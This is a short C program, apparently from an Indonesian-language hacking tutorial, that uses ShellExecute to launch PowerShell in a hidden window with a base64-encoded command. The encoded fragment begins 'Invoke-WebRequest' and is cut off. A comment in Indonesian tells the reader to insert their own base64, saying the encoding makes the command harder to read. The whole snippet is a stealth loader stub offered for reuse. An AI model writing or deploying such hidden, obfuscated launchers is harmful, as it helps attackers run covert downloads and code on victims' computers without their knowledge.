int main() {
    ShellExecute(NULL, "open", "powershell.exe",
        "-NoP -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AG",
        NULL, SW_HIDE);    // <- Ganti dengan base64 lu sendiri (ini biar lebih susah di baca aja nanti)
    return 0;
}
